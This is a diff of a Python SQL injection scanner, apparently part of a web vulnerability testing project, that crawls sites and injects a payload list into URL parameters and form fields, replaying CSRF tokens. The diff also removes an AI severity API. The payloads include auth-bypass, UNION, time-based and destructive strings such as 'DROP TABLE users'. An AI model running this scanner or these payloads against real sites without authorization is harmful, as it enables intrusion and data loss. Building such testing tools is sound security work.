@@ -1,6 +1,8 @@
 import asyncio
 import logging
-import time
+import requests
+import os
+import time  # FIX 1: moved to module level (was imported inside loops)
 from dataclasses import dataclass, field
 from typing import List, Dict, Optional, Set
 from urllib.parse import urlencode, urlparse, parse_qs, urljoin
@@ -9,20 +11,15 @@ from tqdm import tqdm
 from crawler import dfs
 from playwright.async_api import async_playwright, BrowserContext
 from playwright._impl._errors import TargetClosedError
-from dotenv import load_dotenv
-import requests
-import os
+
+
+# AI API endpoint
+AI_API_URL = "http://127.0.0.1:8000/analyze"
+
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Load from the WebVulnScanner folder (parent of API)
-load_dotenv(os.path.join(os.path.dirname(__file__), "..", ".env"))  
-
-# ---------------------------------------------------------------------------
-# AI API Configuration
-# ---------------------------------------------------------------------------
-AI_API_URL = os.getenv("AI_API_URL", "http://127.0.0.1:8000/analyze")
 
 # ---------------------------------------------------------------------------
 # SQL Injection Test Data
@@ -37,29 +34,29 @@ SQL_INJECTION_PAYLOADS = [
     "admin' --",
     "admin' #",
     "' or 'a'='a",
-
+    
     # UNION-based SQLi
     "' UNION SELECT NULL --",
     "' UNION SELECT NULL, NULL --",
     "' UNION SELECT NULL, NULL, NULL --",
-
+    
     # Time-based blind SQLi
     "' AND SLEEP(5) --",
     "' AND pg_sleep(5) --",
     "'; WAITFOR DELAY '00:00:05' --",
-
+    
     # Boolean-based blind SQLi
     "' AND '1'='1",
     "' AND '1'='2",
-
+    
     # Error-based SQLi
     "' AND extractvalue(rand(),concat(0x3a,version())) --",
     "' AND updatexml(rand(),concat(0x3a,version()),1) --",
-
+    
     # Comment-based variations
     "' /*",
     "'; DROP TABLE users --",
-
+    
     # Double encoding
     "%27 OR %271%27=%271",
 ]
@@ -96,11 +93,9 @@ class SQLiTestResult:
     url: str
     parameter: Optional[str] = None
     payload: str = ""
-    test_type: str = ""
+    test_type: str = ""  # "url_param", "form_input", "header"
     vulnerable: bool = False
-    confidence: float = 0.0
-    ai_severity: str = "UNKNOWN"
-    ai_confidence: float = 0.0
+    confidence: float = 0.0  # 0.0 to 1.0
     response_time: float = 0.0
     status_code: int = 0
     error_message: Optional[str] = None
@@ -108,7 +103,7 @@ class SQLiTestResult:
     form_action: Optional[str] = None
     form_method: Optional[str] = None
     timestamp: datetime = field(default_factory=datetime.now)
-
+    
     def to_dict(self) -> Dict:
         return {
             "url": self.url,
@@ -117,8 +112,6 @@ class SQLiTestResult:
             "test_type": self.test_type,
             "vulnerable": self.vulnerable,
             "confidence": self.confidence,
-            "ai_severity": self.ai_severity,
-            "ai_confidence": self.ai_confidence,
             "response_time": self.response_time,
             "status_code": self.status_code,
             "error_message": self.error_message,
@@ -130,7 +123,7 @@ class SQLiTestResult:
 
 
 # ---------------------------------------------------------------------------
-# SQL Injector with AI Integration
+# SQL Injector
 # ---------------------------------------------------------------------------
 
 class SQLInjectionTester:
@@ -141,51 +134,13 @@ class SQLInjectionTester:
         check_errors: bool = True,
         check_union: bool = True,
         check_time_based: bool = True,
-        use_ai: bool = True,
     ):
         self.page_timeout_ms = page_timeout_ms
         self.time_threshold_ms = time_threshold_ms
         self.check_errors = check_errors
         self.check_union = check_union
         self.check_time_based = check_time_based
-        self.use_ai = use_ai
         self.results: List[SQLiTestResult] = []
-
-    # ------------------------------------------------------------------
-    # AI Integration
-    # ------------------------------------------------------------------
-
-    def _call_ai_api(self, payload: str, response_text: str = "", language: str = "unknown") -> Dict:
-        """Call the DataRobot-powered AI API for intelligent severity prediction."""
-        if not self.use_ai:
-            return {"severity": "UNKNOWN", "confidence": 0.0}
-
-        try:
-            result = requests.post(
-                AI_API_URL,
-                json={
-                    "payload": payload,
-                    "parameter": "",
-                    "url": "",
-                    "vulnerable_code": response_text[:2000] if response_text else "",
-                    "language": language
-                },
-                timeout=15
-            )
-            if result.status_code == 200:
-                data = result.json()
-                return {
-                    "severity": data.get("severity", "UNKNOWN"),
-                    "confidence": data.get("confidence", 0.0)
-                }
-            logger.debug(f"AI API returned status {result.status_code}")
-            return {"severity": "UNKNOWN", "confidence": 0.0}
-        except requests.exceptions.ConnectionError:
-            logger.debug("AI API not reachable — running without AI")
-            return {"severity": "UNKNOWN", "confidence": 0.0}
-        except Exception as e:
-            logger.debug(f"AI API error: {e}")
-            return {"severity": "UNKNOWN", "confidence": 0.0}
 
     # ------------------------------------------------------------------
     # Helpers
@@ -193,6 +148,15 @@ class SQLInjectionTester:
 
     @staticmethod
     def _css_attr_selector(name: str) -> str:
+        """Build a safe CSS attribute selector for input[name="..."].
+
+        FIX A: The original code used backslash-escaping inside a CSS
+        double-quoted attribute value (e.g. input[name="a\"b"]) which is
+        invalid CSS.  The correct approach is to switch to single-quote
+        delimiters and escape any single quotes that appear in the name.
+        This matches the CSS spec (§ 4.3.7) and is accepted by all browsers
+        and Playwright's selector engine.
+        """
         safe_name = name.replace("\\", "\\\\").replace("'", "\\'")
         return f"input[name='{safe_name}']"
 
@@ -200,9 +164,11 @@ class SQLInjectionTester:
     # Vulnerability Detection
     # ------------------------------------------------------------------
 
-    def _detect_error_based_sqli(self, response_text: str) -> tuple:
+    def _detect_error_based_sqli(self, response_text: str) -> tuple[bool, Optional[str]]:
+        """Detect SQL errors in response."""
         if not self.check_errors:
             return False, None
+        
         for signature in ERROR_SIGNATURES:
             if signature.lower() in response_text.lower():
                 return True, signature
@@ -211,14 +177,28 @@ class SQLInjectionTester:
     def _detect_union_based_sqli(
         self, response_text: str, baseline: str, status_code: int = 200
     ) -> bool:
+        """Detect UNION-based SQLi by comparing response size/content.
+
+        FIX 2: Added status_code guard. Error/redirect pages (4xx/5xx or very
+        short bodies) caused false positives with the size-ratio heuristic alone.
+        We now require:
+          - A 200-level response, AND
+          - A meaningful baseline length (avoids division-by-near-zero), AND
+          - A significant size change relative to baseline.
+        """
         if not self.check_union:
             return False
+
+        # Only flag 2xx responses — error pages always differ in size
         if not (200 <= status_code < 300):
             return False
+
+        # Ignore tiny baselines; they produce unreliable ratios
         if len(baseline) < 200:
             return False
+
         ratio = len(response_text) / len(baseline)
-        return ratio > 1.5 or ratio < 0.5
+        return ratio > 1.5 or ratio < 0.5  # tightened from 1.2 / 0.8
 
     def _calculate_confidence(
         self,
@@ -227,14 +207,20 @@ class SQLInjectionTester:
         response_time: float,
         payload: str,
     ) -> float:
+        """Calculate vulnerability confidence score (0.0 to 1.0)."""
         confidence = 0.0
+        
         if has_error:
             confidence += 0.7
+        
         if has_union_diff:
             confidence += 0.3
+        
+        # Time-based bonus
         if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
             if response_time > self.time_threshold_ms:
                 confidence += 0.5
+        
         return min(1.0, confidence)
 
     # ------------------------------------------------------------------
@@ -248,14 +234,16 @@ class SQLInjectionTester:
         param_name: str,
         baseline_response: Optional[str] = None,
     ) -> List[SQLiTestResult]:
+        """Test a URL parameter for SQL injection."""
         results = []
         parsed = urlparse(base_url)
         params = parse_qs(parsed.query, keep_blank_values=True)
-
+        
         if param_name not in params:
             logger.warning(f"Parameter {param_name} not found in {base_url}")
             return results
 
+        # Get baseline response
         if not baseline_response:
             try:
                 page = await context.new_page()
@@ -264,68 +252,66 @@ class SQLInjectionTester:
                 try:
                     await page.wait_for_load_state("networkidle", timeout=self.page_timeout_ms)
                 except asyncio.TimeoutError:
-                    pass
+                    pass  # Continue anyway if network idle times out
                 baseline_response = await page.content()
                 await page.close()
             except (TargetClosedError, Exception) as e:
                 logger.debug(f"Failed to get baseline for {base_url}: {e}")
                 baseline_response = None
 
+        # Test each payload
         for payload in SQL_INJECTION_PAYLOADS:
             test_params = params.copy()
             test_params[param_name] = [payload]
-
+            
+            # Flatten params for urlencode
             flat_params = {}
             for k, v in test_params.items():
                 flat_params[k] = v[0] if isinstance(v, list) else v
-
+            
             query_string = urlencode(flat_params)
             test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
-
+            
             page = None
             try:
                 page = await context.new_page()
                 page.set_default_timeout(self.page_timeout_ms)
                 start_time = time.time()
-
+                
                 response = await page.goto(test_url, timeout=self.page_timeout_ms, wait_until="domcontentloaded")
-
+                
+                # Wait for network idle but don't fail if it times out
                 try:
                     await page.wait_for_load_state("networkidle", timeout=self.page_timeout_ms)
                 except asyncio.TimeoutError:
                     logger.debug(f"Network idle timeout for {test_url}")
-
+                
                 response_text = await page.content()
-                response_time = (time.time() - start_time) * 1000
+                
+                response_time = (time.time() - start_time) * 1000  # ms
                 status_code = response.status if response else 0
 
+                # Check for errors
                 has_error, error_sig = self._detect_error_based_sqli(response_text)
+                
+                # FIX 2: pass status_code to union check to reduce false positives
                 has_union_diff = (
                     self._detect_union_based_sqli(response_text, baseline_response, status_code)
                     if baseline_response else False
                 )
-
-                rule_confidence = self._calculate_confidence(has_error, has_union_diff, response_time, payload)
-
-                # Call AI API
-                ai_result = self._call_ai_api(payload, response_text)
-                ai_severity = ai_result["severity"]
-                ai_confidence = ai_result["confidence"]
-
-                # Combine rule + AI confidence
-                combined_confidence = max(rule_confidence, ai_confidence)
-                is_vulnerable = has_error or has_union_diff or response_time > self.time_threshold_ms or ai_confidence > 0.7
-
-                if is_vulnerable or combined_confidence > 0.3:
+                
+                # Determine vulnerability
+                is_vulnerable = has_error or has_union_diff or response_time > self.time_threshold_ms
+                confidence = self._calculate_confidence(has_error, has_union_diff, response_time, payload)
+                
+                if is_vulnerable or confidence > 0.3:
                     result = SQLiTestResult(
                         url=test_url,
                         parameter=param_name,
                         payload=payload,
                         test_type="url_param",
                         vulnerable=is_vulnerable,
-                        confidence=combined_confidence,
-                        ai_severity=ai_severity,
-                        ai_confidence=ai_confidence,
+                        confidence=confidence,
                         response_time=response_time,
                         status_code=status_code,
                         error_message=error_sig,
@@ -333,12 +319,11 @@ class SQLInjectionTester:
                     )
                     results.append(result)
                     self.results.append(result)
-
+                    
                     if is_vulnerable:
                         logger.warning(f"[VULNERABLE] {param_name} in {base_url}")
                         logger.warning(f"  Payload: {payload}")
-                        logger.warning(f"  Rule Confidence: {rule_confidence:.2%}")
-                        logger.warning(f"  AI Severity: {ai_severity} (Confidence: {ai_confidence:.2%})")
+                        logger.warning(f"  Confidence: {confidence:.2%}")
 
             except (TargetClosedError, ConnectionError) as e:
                 logger.debug(f"Target closed while testing {test_url}: {e}")
@@ -356,6 +341,7 @@ class SQLInjectionTester:
         return results
 
     async def _extract_csrf_tokens(self, page) -> Dict[str, str]:
+        """Extract CSRF/authenticity tokens from the page."""
         tokens = {}
         try:
             hidden_inputs = await page.query_selector_all('input[type="hidden"]')
@@ -365,8 +351,23 @@ class SQLInjectionTester:
                     value = await input_elem.get_attribute("value")
                     if name and value:
                         tokens[name] = value
+                        if any(kw in name.lower() for kw in ["csrf", "authenticity", "token", "_token"]):
+                            logger.debug(f"Found CSRF token: {name}")
                 except Exception:
                     pass
+            
+            csrf_inputs = await page.query_selector_all('[data-csrf], [data-authenticity-token]')
+            for input_elem in csrf_inputs:
+                try:
+                    csrf_value = await input_elem.get_attribute("data-csrf")
+                    if csrf_value:
+                        tokens["_csrf"] = csrf_value
+                    auth_value = await input_elem.get_attribute("data-authenticity-token")
+                    if auth_value:
+                        tokens["authenticity_token"] = auth_value
+                except Exception:
+                    pass
+            
             csrf_meta = await page.query_selector('meta[name="csrf-token"]')
             if csrf_meta:
                 try:
@@ -375,11 +376,22 @@ class SQLInjectionTester:
                         tokens["_csrf"] = csrf_value
                 except Exception:
                     pass
+            
+            try:
+                cookies = await page.context.cookies()
+                for cookie in cookies:
+                    if any(kw in cookie.get("name", "").lower() for kw in ["csrf", "xsrf"]):
+                        tokens[cookie["name"]] = cookie.get("value", "")
+            except Exception:
+                pass
+                
         except Exception as e:
             logger.debug(f"Error extracting CSRF tokens: {e}")
+        
         return tokens
 
     async def _fill_form_field_safe(self, page, selector: str, value: str, retries: int = 3) -> bool:
+        """Safely fill a form field with retry logic."""
         for attempt in range(retries):
             try:
                 await page.wait_for_selector(selector, timeout=3000)
@@ -390,12 +402,14 @@ class SQLInjectionTester:
                 await page.wait_for_timeout(100)
                 await page.fill(selector, value, timeout=5000)
                 return True
-            except (TargetClosedError, ConnectionError):
+            except (TargetClosedError, ConnectionError) as e:
+                logger.debug(f"Target closed while filling field {selector}: {e}")
                 return False
-            except Exception:
+            except Exception as e:
                 if attempt < retries - 1:
                     await page.wait_for_timeout(100 * (attempt + 1))
                     continue
+                logger.debug(f"Failed to fill {selector} after {retries} attempts: {e}")
                 return False
         return False
 
@@ -409,6 +423,7 @@ class SQLInjectionTester:
         form_data: Dict,
         base_url: str,
     ) -> List[SQLiTestResult]:
+        """Test form inputs for SQL injection."""
         results = []
         action = form_data.get("action", base_url)
         method = form_data.get("method", "get").lower()
@@ -417,6 +432,7 @@ class SQLInjectionTester:
         if not inputs:
             return results
 
+        # Get baseline response and extract tokens from the form page
         page = None
         baseline_response = None
         csrf_tokens = {}
@@ -430,12 +446,18 @@ class SQLInjectionTester:
                 pass
             baseline_response = await page.content()
             csrf_tokens = await self._extract_csrf_tokens(page)
+            if csrf_tokens:
+                logger.debug(f"Extracted {len(csrf_tokens)} token(s) from form: {list(csrf_tokens.keys())}")
             await page.close()
         except (TargetClosedError, Exception) as e:
             logger.debug(f"Failed to get baseline for {action}: {e}")
             baseline_response = None
 
+        # Test each input field
         for input_name in inputs:
+            # FIX A: use _css_attr_selector() for correct single-quoted CSS escaping.
+            # The original code used backslash-escaping inside double-quoted CSS attribute
+            # values (input[name="a\"b"]) which is invalid per the CSS spec.
             selector = self._css_attr_selector(input_name)
 
             for payload in SQL_INJECTION_PAYLOADS:
@@ -443,31 +465,48 @@ class SQLInjectionTester:
                 try:
                     page = await context.new_page()
                     page.set_default_timeout(self.page_timeout_ms)
-
+                    
                     await page.goto(base_url, timeout=self.page_timeout_ms, wait_until="domcontentloaded")
                     try:
                         await page.wait_for_load_state("networkidle", timeout=self.page_timeout_ms)
                     except asyncio.TimeoutError:
                         pass
-
+                    
+                    # Extract fresh CSRF tokens for each test (tokens may rotate)
                     fresh_tokens = await self._extract_csrf_tokens(page)
+                    
                     start_time = time.time()
-                    status_code = 200
+                    status_code = 200  # default
 
                     if method == "post":
-                        fill_success = await self._fill_form_field_safe(page, selector, payload, retries=2)
-
+                        fill_success = await self._fill_form_field_safe(
+                            page,
+                            selector,
+                            payload,
+                            retries=2
+                        )
+                        
                         if fill_success:
+                            # FIX A: use _css_attr_selector() for CSRF token selectors too.
+                            # The original code had an inline f-string with backslash-escaping
+                            # which produced invalid CSS (e.g. input[name="a\"b"]).
                             for token_name, token_value in fresh_tokens.items():
                                 token_selector = self._css_attr_selector(token_name)
                                 try:
                                     await page.fill(token_selector, token_value, timeout=2000)
+                                    logger.debug(f"Filled CSRF token: {token_name}")
                                 except Exception:
                                     pass
-
+                            
+                            # FIX B: capture the actual HTTP status code of the POST response
+                            # by attaching a response listener before the form is submitted.
+                            # The original code hardcoded status_code = 200 for all POST
+                            # requests, making _detect_union_based_sqli unreliable (it always
+                            # passed the 2xx guard, causing false positives on error pages).
                             last_response_status: list[int] = []
 
                             async def _capture_status(response):
+                                # Only record the main document response (ignore sub-resources)
                                 if response.request.resource_type == "document":
                                     last_response_status.append(response.status)
 
@@ -477,7 +516,7 @@ class SQLInjectionTester:
                                 await page.click("button[type='submit']", timeout=3000)
                             except Exception:
                                 await page.press(selector, "Enter")
-
+                            
                             try:
                                 await page.wait_for_load_state("networkidle", timeout=self.page_timeout_ms)
                             except asyncio.TimeoutError:
@@ -492,8 +531,9 @@ class SQLInjectionTester:
                         form_inputs = {}
                         for field_name in inputs:
                             form_inputs[field_name] = payload if field_name == input_name else "test"
+                        
                         form_inputs.update(fresh_tokens)
-
+                        
                         query_string = urlencode(form_inputs)
                         test_url = f"{action}?{query_string}"
                         response = await page.goto(test_url, timeout=self.page_timeout_ms, wait_until="domcontentloaded")
@@ -502,36 +542,28 @@ class SQLInjectionTester:
                         except asyncio.TimeoutError:
                             pass
                         status_code = response.status if response else 0
-
-                    response_time = (time.time() - start_time) * 1000
+                    
+                    response_time = (time.time() - start_time) * 1000  # ms
                     response_text = await page.content()
 
                     has_error, error_sig = self._detect_error_based_sqli(response_text)
+                    # FIX 2: pass status_code to union check
                     has_union_diff = (
                         self._detect_union_based_sqli(response_text, baseline_response, status_code)
                         if baseline_response else False
                     )
-
-                    rule_confidence = self._calculate_confidence(has_error, has_union_diff, response_time, payload)
-
-                    # Call AI API
-                    ai_result = self._call_ai_api(payload, response_text)
-                    ai_severity = ai_result["severity"]
-                    ai_confidence = ai_result["confidence"]
-
-                    combined_confidence = max(rule_confidence, ai_confidence)
-                    is_vulnerable = has_error or has_union_diff or response_time > self.time_threshold_ms or ai_confidence > 0.7
-
-                    if is_vulnerable or combined_confidence > 0.3:
+                    
+                    is_vulnerable = has_error or has_union_diff or response_time > self.time_threshold_ms
+                    confidence = self._calculate_confidence(has_error, has_union_diff, response_time, payload)
+                    
+                    if is_vulnerable or confidence > 0.3:
                         result = SQLiTestResult(
                             url=action,
                             parameter=input_name,
                             payload=payload,
                             test_type="form_input",
                             vulnerable=is_vulnerable,
-                            confidence=combined_confidence,
-                            ai_severity=ai_severity,
-                            ai_confidence=ai_confidence,
+                            confidence=confidence,
                             response_time=response_time,
                             status_code=status_code,
                             error_message=error_sig,
@@ -541,11 +573,10 @@ class SQLInjectionTester:
                         )
                         results.append(result)
                         self.results.append(result)
-
+                        
                         if is_vulnerable:
                             logger.warning(f"[VULNERABLE] Form field {input_name} in {action}")
                             logger.warning(f"  Payload: {payload}")
-                            logger.warning(f"  AI Severity: {ai_severity}")
 
                 except (TargetClosedError, ConnectionError) as e:
                     logger.debug(f"Target closed while testing form field {input_name}: {e}")
@@ -567,42 +598,52 @@ class SQLInjectionTester:
     # ------------------------------------------------------------------
 
     async def test_crawler_results(self, crawl_results) -> List[SQLiTestResult]:
+        """Test all URLs and forms from crawler results."""
         all_results = []
+        
+        # FIX C: crawl_results is a synchronous generator (dfs.DFSCrawler.crawl()
+        # returns a regular generator, not an async one).  The original code used
+        # `async for` which raises TypeError on a plain generator.
         crawl_list = list(crawl_results)
-
+        
         async with async_playwright() as pw:
             browser = await pw.chromium.launch(headless=True)
             context = await browser.new_context()
-
+            
+            # Block heavy resources
             await context.route(
                 "**/*",
                 lambda route: route.abort()
                 if route.request.resource_type in {"image", "media", "font"}
                 else route.continue_(),
             )
-
+            
             with tqdm(total=len(crawl_list), desc="Testing pages", unit=" pages", colour="green") as pbar:
                 for crawl_result in crawl_list:
                     logger.info(f"Testing {crawl_result.url}")
-
+                    
                     if crawl_result.params:
                         for param in crawl_result.params:
                             results = await self.test_url_parameter(
-                                context, crawl_result.url, param,
+                                context,
+                                crawl_result.url,
+                                param,
                             )
                             all_results.extend(results)
-
+                    
                     if crawl_result.forms:
                         for form in crawl_result.forms:
                             results = await self.test_form(
-                                context, form, crawl_result.url,
+                                context,
+                                form,
+                                crawl_result.url,
                             )
                             all_results.extend(results)
-
+                    
                     pbar.update(1)
-
+            
             await browser.close()
-
+        
         return all_results
 
     # ------------------------------------------------------------------
@@ -618,37 +659,37 @@ class SQLInjectionTester:
     def get_summary(self) -> Dict:
         vulnerable = self.get_vulnerable_results()
         total = len(self.results)
-        ai_high = sum(1 for r in vulnerable if r.ai_severity == "CRITICAL")
-
+        
         return {
             "total_tests": total,
             "vulnerabilities_found": len(vulnerable),
-            "ai_critical_count": ai_high,
             "severity_distribution": {
                 "high": sum(1 for r in vulnerable if r.confidence > 0.7),
                 "medium": sum(1 for r in vulnerable if 0.5 < r.confidence <= 0.7),
                 "low": sum(1 for r in vulnerable if r.confidence <= 0.5),
             },
-            "affected_parameters": list({r.parameter for r in vulnerable if r.parameter is not None}),
+            # FIX 5: filter out None before building the set
+            "affected_parameters": list(
+                {r.parameter for r in vulnerable if r.parameter is not None}
+            ),
             "affected_urls": list(set(r.url for r in vulnerable)),
         }
 
     def print_summary(self):
         summary = self.get_summary()
         print("\n" + "=" * 80)
-        print("SQL INJECTION TEST SUMMARY (WITH AI)")
+        print("SQL INJECTION TEST SUMMARY")
         print("=" * 80)
         print(f"Total Tests: {summary['total_tests']}")
         print(f"Vulnerabilities Found: {summary['vulnerabilities_found']}")
-        print(f"AI CRITICAL Severity: {summary['ai_critical_count']}")
         print("\nSeverity Distribution:")
         print(f"  High: {summary['severity_distribution']['high']}")
         print(f"  Medium: {summary['severity_distribution']['medium']}")
         print(f"  Low: {summary['severity_distribution']['low']}")
-
+        
         if summary['affected_parameters']:
             print(f"\nAffected Parameters: {', '.join(summary['affected_parameters'])}")
-
+        
         if summary['affected_urls']:
             print(f"\nAffected URLs:")
             for url in summary['affected_urls'][:10]:
@@ -657,7 +698,7 @@ class SQLInjectionTester:
 
 
 # ---------------------------------------------------------------------------
-# Entry Point
+# Entry Point (Example Usage)
 # ---------------------------------------------------------------------------
 
 async def run_example():
@@ -666,26 +707,24 @@ async def run_example():
         max_depth=2,
         concurrency=3,
     )
-
+    
     tester = SQLInjectionTester(
         page_timeout_ms=30000,
         time_threshold_ms=4000,
         check_errors=True,
         check_union=True,
         check_time_based=True,
-        use_ai=True,  # Enable AI integration
     )
-
+    
     await tester.test_crawler_results(crawler.crawl())
     tester.print_summary()
-
+    
     vulnerabilities = tester.get_vulnerable_results()
     for vuln in vulnerabilities:
         print(f"[{vuln.test_type.upper()}] {vuln.url}")
         print(f"  Parameter: {vuln.parameter}")
         print(f"  Payload: {vuln.payload}")
-        print(f"  Rule Confidence: {vuln.confidence:.2%}")
-        print(f"  AI Severity: {vuln.ai_severity} ({vuln.ai_confidence:.2%})")
+        print(f"  Confidence: {vuln.confidence:.2%}")
         if vuln.error_message:
             print(f"  Error: {vuln.error_message}")
         print()
